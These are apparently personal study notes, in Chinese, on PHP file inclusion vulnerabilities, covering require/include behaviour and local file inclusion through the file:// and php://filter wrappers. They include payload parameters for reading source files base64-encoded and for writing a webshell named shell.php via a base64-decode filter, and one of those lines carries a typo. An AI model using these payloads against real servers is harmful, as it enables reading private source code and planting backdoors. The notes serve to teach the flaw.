文件包含(文件上传完会进行解析)

即脚本中含另外一个文件，即文件引用，可以保证统一风格，导航栏、底部footer栏

漏洞原因

参数没有严格过滤，被用户控制包含恶意文件

php中文件包含函数

require

require：函数出错，报错，退出

require_once:出错，直接退出，仅包含一次，脚本执行时，同一个文件文件可能被多次引用，出现函数重定义，变量重新赋值

include

nclude() 函数用于包含并运行一个指定的文件

在包含文件时，如果文件中存在 PHP 代码，那么这些代码将被执行。如果只是包含静态内容（如 HTML 或纯文本），则内容将被直接输出到浏览器。

include：错误，警报，继续执行

include_once:出错，警告，仅含一次

include_once() 与 include() 类似，但它会先检查文件是否已经被包含过，如果已经被包含，则不会再次包含。

类型和利用

本地文件包含local file include

(是服务器的本地文件)

被包含文件在服务器本地

利用，本地敏感文件，上传文件

    • file://

    • php://filter 这里面的php会被编译所以给源码不执行，

      • 读取php://filter/read或者write=或者省略convert.base64-encode/resource=index.php

      • 改写，四个字符一组解码，大小写，0-9+/

        post传参为test=b后边是木马编码

        1、&file=php：//filter/write=convert.base64-decode/resource=shell.php

        2、&file=php://filter/write=string.strip_tags|cnvert.base64-decode/resource=shell.php

        这个会去除html和php标签的内容，然后对想要的进行解码

      php://filter 本身==不会直接导致回显，==它只是一个数据流的过滤器。回显（echo）是指将数据输出到浏览器或其他输出设备。如果你想要在应用了 php://filter 过滤器之后回显数据，你需要显式地使用 echo 或其他输出函数来输出处理后的数据。
